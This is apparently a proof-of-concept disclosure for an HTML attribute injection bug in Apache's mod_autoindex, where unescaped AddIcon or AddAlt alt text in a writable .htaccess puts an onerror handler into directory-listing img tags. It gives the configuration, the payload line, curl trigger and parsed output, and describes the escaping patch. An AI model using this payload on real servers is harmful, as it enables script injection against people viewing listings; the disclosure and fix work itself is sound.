# PoC 086 - mod_autoindex Unescaped Alt Text In `<img alt>`

`output_directories()` emits `ar[x]->alt` directly inside `alt="[ ... ]"` for
both FancyIndexing and HTMLTable rendering. Quote-bearing `AddAlt` /
`AddIcon (alt,icon)` text injects HTML attributes.

## Setup

`/etc/apache2/httpd.conf`:

```apache
ServerName localhost
Listen 8080
LoadModule mpm_event_module modules/mod_mpm_event.so
LoadModule authn_core_module modules/mod_authn_core.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule unixd_module modules/mod_unixd.so
LoadModule dir_module modules/mod_dir.so
LoadModule autoindex_module modules/mod_autoindex.so

DocumentRoot "/srv/www"
<Directory "/srv/www">
    Options +Indexes
    DirectoryIndex disabled
    IndexOptions FancyIndexing HTMLTable
    AllowOverride Indexes
    Require all granted
</Directory>
```

`/srv/www/listing/.htaccess`:

```apache
Options +Indexes
IndexOptions FancyIndexing HTMLTable

# AddIcon (alt,icon) parses the parenthesised pair; the alt half flows
# unescaped into <img alt="[...]">.
AddIcon "(x\" onerror=\"alert(1),/icons/text.gif)" *.txt
```

```bash
mkdir -p /srv/www/listing
touch /srv/www/listing/note.txt
```

## Trigger

```bash
curl -s http://127.0.0.1:8080/listing/ | grep '<img'
```

## Observed effect

The generated `<img>` tag carries attacker-controlled attributes:

```html
<img src="/icons/text.gif" alt="[x" onerror="alert(1)]">
```

A browser rendering the directory index attempts to load `/icons/text.gif`,
fails or succeeds, and either way executes the injected `onerror` handler in
the listing's origin. The TableIndexing branch produces an equivalent row.

## Log marker

No server-side log entry. To validate from the response without a browser:

```bash
curl -s http://127.0.0.1:8080/listing/ \
  | python3 -c 'import sys,html.parser as h
class P(h.HTMLParser):
    def handle_starttag(self,t,a): 
        if t=="img": print(t,a)
P().feed(sys.stdin.read())'
```

Output:

```text
img [('src', '/icons/text.gif'), ('alt', '[x'), ('onerror', 'alert(1)]')]
```

The presence of an `onerror` attribute on the `<img>` proves attribute
injection.

## Notes

- The same vector applies to `AddAlt "x\" onerror=..." *.txt`; the `AddAlt`
  string is what populates `ar[x]->alt` in `make_autoindex_entry`.
- The patch wraps `(ar[x]->alt ? ar[x]->alt : "   ")` with
  `ap_escape_html(scratch, ...)` at both `<img alt>` emitters
  (`mod_autoindex.c:1716` table, `:1806` fancy).
- Reachability mirrors PoC 085: writable `.htaccess` plus
  `AllowOverride Indexes` is sufficient.
